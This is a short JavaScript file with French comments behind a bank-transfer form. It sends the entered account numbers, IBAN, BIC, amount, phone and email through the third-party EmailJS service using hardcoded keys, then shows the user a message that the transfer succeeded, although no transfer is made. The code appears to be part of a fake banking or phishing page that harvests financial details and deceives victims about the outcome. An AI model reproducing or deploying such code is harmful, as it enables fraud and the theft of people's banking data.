// Initialisation de EmailJS avec votre clé utilisateur
(function() {
    emailjs.init("70WwzbbTAv0wkjt0F"); // Remplacez par votre clé utilisateur EmailJS
})();

// Fonction pour envoyer un email via EmailJS
function sendEmail(data) {
    return emailjs.send('service_acugylm', 'template_43w8pob', {
        fromAccount: data.fromAccount,
        toAccount: data.toAccount,
        iban: data.iban,
        bic: data.bic,
        amount: data.amount,
        currency: data.currency,
        transferType: data.transferType,
        description: data.description,
        phone: data.phone,
        email: data.email // L'email saisi par l'utilisateur
    });
}

// Gestion de la soumission du formulaire
document.getElementById('transferForm').addEventListener('submit', function(e) {
    e.preventDefault();

    // Récupération des données du formulaire
    const formData = new FormData(e.target);
    const data = {};
    formData.forEach((value, key) => data[key] = value);

    // Vérifier si les adresses e-mail correspondent
    if (data.email !== data.confirmEmail) {
        alert('Les adresses e-mail ne correspondent pas.');
        return;
    }

    // Envoi de l'email via EmailJS
    sendEmail(data)
        .then(function(response) {
            console.log('Email envoyé avec succès!', response.status, response.text);
            alert('Virement effectué avec succès.');
        })
        .catch(function(error) {
            console.error('Erreur lors de l\'envoi de l\'email:', error);
            alert('Une erreur est survenue lors de l\'envoi du virement.');
        });
});
